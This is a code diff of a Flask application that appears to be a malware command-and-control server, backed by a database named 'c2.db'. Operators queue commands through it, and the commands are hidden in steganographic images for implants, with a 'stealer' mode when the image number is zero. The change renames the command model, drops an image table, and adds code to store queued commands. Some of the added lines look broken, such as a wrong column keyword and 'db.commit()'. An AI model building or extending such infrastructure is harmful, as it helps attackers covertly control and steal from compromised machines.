@@ -53,13 +53,7 @@ def main():
     size_db = os.path.getsize("database/c2.db")
 
 
-class CommandImages(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    image = db.Column(db.Text(4294000000))
-    done = db.Column(db.Boolean)
-
-
-class Command(db.Model):
+class Commands(db.Model):
 
     id = db.Column(db.Integer, primary_key=True)
     cmd = db.Column(db.String(4096))
@@ -130,7 +124,7 @@ def request_loader(request):
 @app.route('/home')
 @flask_login.login_required
 def home():
-    get_commands = Command.query.all()
+    get_commands = Commands.query.all()
     if len(Results.query.all()) == 0:
         return render_template('index.html', returns=' \n ', name=flask_login.current_user.id)
     else:
@@ -165,14 +159,6 @@ def register():
 
 # TODO CHANGE COMMANDS FUNCTION TO WORK WITH STEGANOGRAPHY
 # NOTE WE WILL PROBABLY HAVE TO CHANGE THE SQL DATABASE WITH THIS, TOO
-
-
-def getImages():
-    images_raw = CommandImages.query.all()
-    images = []
-    for x in images_raw:
-        images.append(x.image)
-    return images
 
 
 @app.route("/get-image/<image_name>", methods=['GET', 'POST'])
@@ -222,14 +208,13 @@ def getCommand():
             except:
                 render_template('redir.html')
 
-            task_queue = Command.query.all()
+            task_queue = Commands.query.all()
             image_name = imageNum + "_diniFall.png"
             stealer = False
             if int(imageNum) == 0:
                 stealer = True
             if os.path.exists("encImages/" + image_name) or int(imageNum) == 0:
                 return render_template('commands.html', stealer=stealer, image_name=image_name)
-            # TODO CONVERT THESE COMMANDS TO STEGA PICTURES AND STORE THEM IN A FILE? OR MAKE A LIST
 
             return render_template('redir.html')
 
@@ -249,6 +234,10 @@ def create():
     if request.form['task_3'] != None:
         cmd3 = request.form['task_3']
 
+    new_cmds = Commands(command=cmd + cmd2 + cmd3, done=True)
+    db.session.add(new_cmds)
+    db.commit()
+
     cmds = [cmd, cmd2, cmd3]
     pic_num = random.randint(1, 5)
     print("PIC NUM: ", pic_num)
@@ -265,7 +254,7 @@ def create():
 
 @app.route('/delete/<id>')
 def delete(id):
-    Command.query.filter_by(id=int(id)).delete()
+    Commands.query.filter_by(id=int(id)).delete()
     db.session.commit()
     return redirect(url_for('home'))
 
